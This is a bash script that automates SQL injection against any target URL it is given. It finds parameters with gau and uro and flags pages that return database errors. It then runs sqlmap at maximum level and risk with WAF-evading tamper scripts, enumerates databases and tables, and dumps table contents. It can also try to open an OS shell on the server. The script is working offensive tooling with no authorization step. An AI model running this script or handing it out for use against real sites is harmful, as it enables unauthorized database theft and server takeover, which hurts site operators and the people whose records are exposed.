#!/bin/bash

# Check if the target URL is provided as an argument
if [ -z "$1" ]; then
  echo "Usage: $0 <target>"
  exit 1
fi

TARGET=$1
TARGET_NAME=$(echo "$TARGET" | sed 's|https\?://||' | cut -d '/' -f 1) # Extract hostname for folder name
OUTPUT_DIR="/mnt/sqli/${TARGET_NAME}_output"

# Create a folder named after the target
mkdir -p "$OUTPUT_DIR"
echo "[+] Created output directory: $OUTPUT_DIR"

echo "[+] Target: $TARGET"

# Step 1: Automating SQL Injection Discovery
echo "[+] Step 1: Discovering SQL Injection Points..."
echo "$TARGET" | gau | uro | grep "\?" | sed "s/=.*/=A'/" | uniq > "${OUTPUT_DIR}/params.txt"
cat "${OUTPUT_DIR}/params.txt" | httpx -mc 200 -mr ".*SQL.*|.*syntax.*|.*error.*|.*database.*|.*ODBC.*|.*mysqli.*|.*MySQL.*|.*pgSQL.*" -silent > "${OUTPUT_DIR}/potential_vulns.txt"

if [ -s "${OUTPUT_DIR}/potential_vulns.txt" ]; then
  echo "[+] Potential vulnerable endpoints found:"
  cat "${OUTPUT_DIR}/potential_vulns.txt"
else
  echo "[-] No potential vulnerable endpoints found."
  exit 1
fi

# Step 2: Analyzing the Results
echo "[+] Step 2: Analyzing Results with Manual Payloads..."
while read -r endpoint; do
  echo "[+] Testing endpoint: $endpoint"

  # Test for SQL syntax errors
  curl -s "$endpoint" | grep -i "SQL syntax"
  if [ $? -eq 0 ]; then
    echo "[+] Possible SQL Injection vulnerability detected at: $endpoint"
    VULN_ENDPOINT=$endpoint
    break
  fi
done < "${OUTPUT_DIR}/potential_vulns.txt"

if [ -z "$VULN_ENDPOINT" ]; then
  echo "[-] No confirmed SQL Injection vulnerabilities found."
  exit 1
fi

# Step 3: Advanced Exploitation with SQLMap
echo "[+] Step 3: Exploiting Vulnerability with SQLMap..."
PARAM=$(echo "$VULN_ENDPOINT" | grep -oP "(?<=\?).*(?==)")
DBMS="MSSQL" # Change this based on your target's DBMS

sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" --dbms="$DBMS" --level 5 --risk 3 --banner --batch --random-agent --tamper=space2comment --output-dir="$OUTPUT_DIR"

# Step 4: Extracting Data from the Database
echo "[+] Step 4: Extracting Data from the Database..."
read -p "[?] Do you want to enumerate databases? (y/n): " ENUM_DB
if [[ "$ENUM_DB" == "y" || "$ENUM_DB" == "Y" ]]; then
  sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" --dbs --output-dir="$OUTPUT_DIR"
fi

read -p "[?] Enter the database name to enumerate tables: " DB_NAME
if [ ! -z "$DB_NAME" ]; then
  sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" -D "$DB_NAME" --tables --output-dir="$OUTPUT_DIR"
fi

read -p "[?] Enter the table name to dump data: " TABLE_NAME
if [ ! -z "$TABLE_NAME" ]; then
  sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" -D "$DB_NAME" -T "$TABLE_NAME" --dump --output-dir="$OUTPUT_DIR"
fi

# Optional: Advanced Techniques
read -p "[?] Do you want to attempt WAF bypass or OS shell access? (y/n): " ADVANCED
if [[ "$ADVANCED" == "y" || "$ADVANCED" == "Y" ]]; then
  echo "[+] Attempting WAF bypass with tamper scripts..."
  sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" --dbms="$DBMS" --level 5 --risk 3 --banner --batch --random-agent --tamper=space2comment,between,percentage --output-dir="$OUTPUT_DIR"

  read -p "[?] Do you want to attempt OS shell access? (y/n): " OS_SHELL
  if [[ "$OS_SHELL" == "y" || "$OS_SHELL" == "Y" ]]; then
    sqlmap -u "$VULN_ENDPOINT" -p "$PARAM" --os-shell --output-dir="$OUTPUT_DIR"
  fi
fi

echo "[+] Script execution completed. All outputs saved in: $OUTPUT_DIR"